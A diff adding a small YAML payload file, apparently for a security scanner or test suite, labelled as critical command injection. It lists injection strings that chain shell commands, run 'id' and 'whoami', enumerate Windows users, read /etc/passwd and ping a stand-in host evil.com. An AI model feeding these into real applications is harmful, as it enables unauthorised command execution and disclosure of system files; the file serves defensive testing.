@@ -1,0 +1,9 @@
+name: Command Injection Variant 15
+payloads:
+- ls; whoami
+- ping -c 4 evil.com
+- '`id`'
+- '&& net user'
+- '| cat /etc/passwd'
+severity: critical
+type: command_injection
